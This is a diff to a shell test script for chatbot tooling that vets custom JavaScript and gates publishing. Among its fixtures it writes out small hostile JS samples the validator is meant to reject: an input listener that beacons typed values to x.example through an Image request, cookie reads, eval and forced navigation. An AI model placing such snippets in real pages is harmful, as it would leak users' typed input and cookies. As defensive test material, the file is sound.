@@ -4,7 +4,9 @@
 set -u
 HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
 SRC="$HERE/plugins/landbot/skills/landbot-flows/scripts"
-T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
+TROOT="$(mktemp -d)"; trap 'rm -rf "$TROOT"' EXIT
+T="$TROOT/landbot-flows/scripts"; mkdir -p "$T" "$TROOT/landbot-style/modules"
+cp "$HERE/plugins/landbot/skills/landbot-style/modules/"*.js "$TROOT/landbot-style/modules/"
 cp "$SRC/channel" "$SRC/draft-check" "$T/"; cp "$SRC/lb" "$T/lb.real"
 export LANDBOT_STATE_DIR="$T/state"
 cat > "$T/lb" <<'E'
@@ -62,25 +64,44 @@ printf '/* lb-js: t */\nvar c = document.cookie;\n' > "$T/cookie.js"
 printf '/* lb-js: t */\nwindow.eval("1");\n' > "$T/eval.js"
 printf '<script src="https://cdn.example.com/x.js"></script>\n/* lb-js: t */\n' > "$T/src.js"
 { printf '/* lb-js: big */\n'; head -c 61000 /dev/zero | tr '\0' 'a'; } > "$T/big.js"
-t "js ok"                      0:1 "$C" js "$T/ok.js" --bot BOT
-t "js without marker"         65:0 "$C" js "$T/nomark.js" --bot BOT
-t "js with #{"                65:0 "$C" js "$T/hash.js" --bot BOT
-t "js with fetch"             65:0 "$C" js "$T/fetch.js" --bot BOT
-t "js reading cookies"        65:0 "$C" js "$T/cookie.js" --bot BOT
-t "js with eval"              65:0 "$C" js "$T/eval.js" --bot BOT
-t "js loading a script"       65:0 "$C" js "$T/src.js" --bot BOT
-t "js over 60k"               65:0 "$C" js "$T/big.js" --bot BOT
+t "custom js without a config url is not verified" 4:1 "$C" js "$T/ok.js" --bot BOT --custom
+t "custom js without --custom refused" 65:0 "$C" js "$T/ok.js" --bot BOT
+t "js without marker"         65:0 "$C" js "$T/nomark.js" --bot BOT --custom
+t "js with #{"                65:0 "$C" js "$T/hash.js" --bot BOT --custom
+t "js with fetch"             65:0 "$C" js "$T/fetch.js" --bot BOT --custom
+t "js reading cookies"        65:0 "$C" js "$T/cookie.js" --bot BOT --custom
+t "js with eval"              65:0 "$C" js "$T/eval.js" --bot BOT --custom
+t "js loading a script"       65:0 "$C" js "$T/src.js" --bot BOT --custom
+t "js over 60k"               65:0 "$C" js "$T/big.js" --bot BOT --custom
 t "js without --bot"          64:0 "$C" js "$T/ok.js"
-t "js old channel"            70:0 env MOCK_AGE_H=48 "$C" js "$T/ok.js" --bot BOT
+t "js old channel"            70:0 env MOCK_AGE_H=48 "$C" js "$T/ok.js" --bot BOT --custom
 t "js --clear"                 0:1 "$C" js --clear --bot BOT
 t "js --clear with a file"    64:0 "$C" js --clear "$T/ok.js" --bot BOT
 t "--clear on css"            64:0 "$C" css --clear "$T/s.css" --bot BOT
+printf '/* lb-js: t */\ndocument.addEventListener("input", function(e){ (new Image()).src = "https://x.example/c?v=" + e.target.value; });\n' > "$T/img.js"
+printf '/* lb-js: t */\nvar c = document["cookie"];\n' > "$T/cookie2.js"
+printf '/* lb-js: t */\nlocation.href = "https://x.example/";\n' > "$T/loc.js"
+t "custom js: new Image beacon"  65:0 "$C" js "$T/img.js" --bot BOT --custom
+t "custom js: document[cookie]"  65:0 "$C" js "$T/cookie2.js" --bot BOT --custom
+t "custom js: navigation"        65:0 "$C" js "$T/loc.js" --bot BOT --custom
+M="$TROOT/landbot-style/modules"
+sed 's/total: 5, /total: 3, /' "$M/steps.js" > "$T/steps-cfg.js"
+sed 's/total: 5, /total: (function(){ return 3; })(), /' "$M/steps.js" > "$T/steps-fn.js"
+sed 's/var total = Math.max/var total = 1 + Math.max/' "$M/steps.js" > "$T/steps-code.js"
+t "module with CONFIG changed is accepted" 4:1 "$C" js "$T/steps-cfg.js" --bot BOT
+t "module unchanged is accepted"           4:1 "$C" js "$M/messaging.js" --bot BOT
+t "module with code in CONFIG refused"    65:0 "$C" js "$T/steps-fn.js" --bot BOT
+t "module with changed code refused"      65:0 "$C" js "$T/steps-code.js" --bot BOT
 printf '{"foot":null,"version":"3.1.0"}' > "$T/cfg-nofoot.json"
-t "js stored, not served"      3:1 env MOCK_CFG="file://$T/cfg-nofoot.json" "$C" js "$T/ok.js" --bot BOT
-printf '{"foot":"<script>x</script>","version":"3.1.0"}' > "$T/cfg-foot.json"
-t "js served"                  0:1 env MOCK_CFG="file://$T/cfg-foot.json" "$C" js "$T/ok.js" --bot BOT
+t "js stored, not served"      3:1 env MOCK_CFG="file://$T/cfg-nofoot.json" "$C" js "$T/ok.js" --bot BOT --custom
+printf '{"foot":"<script>x</script>","version":"3.1.0"}' > "$T/cfg-other.json"
+t "js: config serves another script" 5:1 env MOCK_CFG="file://$T/cfg-other.json" "$C" js "$T/ok.js" --bot BOT --custom
+{ printf '<script>\n'; cat "$T/ok.js"; printf '\n</script>\n'; } | jq -Rs '{foot: ., version: "3.1.0"}' > "$T/cfg-foot.json"
+t "js served, same script"     0:1 env MOCK_CFG="file://$T/cfg-foot.json" "$C" js "$T/ok.js" --bot BOT --custom
 rm -rf "$T/state"; "$C" css "$T/s.css" --bot BOT >/dev/null 2>&1
 nb=$(ls "$T/state/backups" 2>/dev/null | wc -l | tr -d ' '); [ "$nb" -ge 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL css write left no backup"; }
+"$C" css "$T/s.css" --bot BOT >/dev/null 2>&1; "$C" css "$T/s.css" --bot BOT >/dev/null 2>&1
+nb2=$(ls "$T/state/backups" | wc -l | tr -d ' '); [ "$nb2" -ge 3 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL two writes in one second overwrote a backup ($nb2 files)"; }
 grep -q 'OP^^' "$C" && { fail=$((fail+1)); echo "FAIL bash-4-only expansion in channel (macOS runs bash 3.2)"; } || pass=$((pass+1))
 
 # draft-check: the gate before a publish, on drafts built by hand
@@ -95,7 +116,10 @@ mk '{data:{save_state:"IS_NOT_VALID",violations:[{code:"param_required",block_id
 g() { local name="$1" want="$2" file="$3"; MOCK_DRAFT="$T/$file" "$DK" gate BOTU >/dev/null 2>&1; local rc=$?
   [ "$rc" = "$want" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL gate $name: rc=$rc, want $want"; }; }
 rm -rf "$T/state"
+g "no snapshot blocks"          65 good.json
+MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
 g "clean draft passes"          0 good.json
+rm -rf "$T/state"
 g "empty draft blocked"        65 empty.json
 g "no greeting blocked"        65 nogreet.json
 g "Ask anything blocked"       65 askany.json
@@ -107,13 +131,27 @@ jq '.data.diagram.nodes.welcome.params.text = "Changed in the builder" | .data.d
 g "changed since save blocked" 65 edited.json
 jq '.data.diagram.nodes.bye.top = 999' "$T/good.json" > "$T/moved.json"
 g "moved-only passes"           0 moved.json
+jq '.data.diagram.nodes.bye2 = .data.diagram.nodes.bye | .data.diagram.connections["welcome.$success--bye"].targetPath = "bye2"' "$T/good.json" > "$T/g2.json"
+MOCK_DRAFT="$T/g2.json" "$DK" save BOTU >/dev/null 2>&1
+jq '.data.diagram.connections["welcome.$success--bye"].targetPath = "bye"' "$T/g2.json" > "$T/rewired.json"
+g "rewired connection blocked" 65 rewired.json
+MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
+MOCK_DRAFT="$T/edited.json" "$DK" diff BOTU --record >/dev/null 2>&1
+MOCK_DRAFT="$T/edited.json" "$DK" save BOTU --auto >/dev/null 2>&1
+g "pending change blocks after an auto save" 65 edited.json
+MOCK_DRAFT="$T/edited.json" "$DK" save BOTU >/dev/null 2>&1
+g "manual save clears the pending change"     0 edited.json
+MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
 MOCK_DRAFT="$T/edited.json" "$DK" diff BOTU >/dev/null 2>&1; [ $? = 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL diff should report the edit"; }
 
 L="$T/lb.real"; export LANDBOT_API_TOKEN=dummy LANDBOT_API_URL=http://127.0.0.1:9
 # publish goes through the gate: a blocked draft is refused before anything is sent (65), a clean one reaches the network (1)
 rm -rf "$T/state"
 t "publish of a blocked draft refused" 65:0 env MOCK_DRAFT="$T/askany.json" "$L" POST /bots/BOTU/versions
+MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
 t "publish of a clean draft is sent"    1:0 env MOCK_DRAFT="$T/good.json" "$L" POST /bots/BOTU/versions
+t "publish with a query string is gated" 65:0 env MOCK_DRAFT="$T/askany.json" "$L" POST "/bots/BOTU/versions?x=1"
+chmod -x "$DK"; t "publish without the checker refused" 65:0 env MOCK_DRAFT="$T/good.json" "$L" POST /bots/BOTU/versions; chmod +x "$DK"
 n50=$(printf 'x%.0s' $(seq 50)); n51=$(printf 'x%.0s' $(seq 51))
 t "name 50 reaches the network" 1:0 "$L" POST /bots "{\"name\":\"$n50\"}"
 t "name 51 refused locally"    65:0 "$L" POST /bots "{\"name\":\"$n51\"}"
@@ -157,6 +195,10 @@ t "stale richErrorText refused" 65:0 "$L" PATCH /bots/x/draft/blocks/q "$rte"
 t "HTML text not compared"       1:0 "$L" PATCH /bots/x/draft/blocks/q "$rth"
 printf '%s' "$rtb" | jq '{diagram:{nodes:{q:.}}}' > "$T/rt.json"
 t "stale richText in PUT diagram" 65:0 "$L" PUT /bots/x/draft "@$T/rt.json"
+t "richText differing only in punctuation refused" 65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $1.00","richText":"<p>Pay $100</p>"}}'
+t "Chinese richText differing refused"             65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的邮箱？</p>"}}'
+t "Chinese richText matching sent"                  1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的名字？</p>"}}'
+t "multi-line richText matching sent"               1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Line one\nLine two","richText":"<p>Line one</p><p>Line two</p>"}}'
 
 echo "guards: $pass passed, $fail failed"
 [ "$fail" = 0 ]
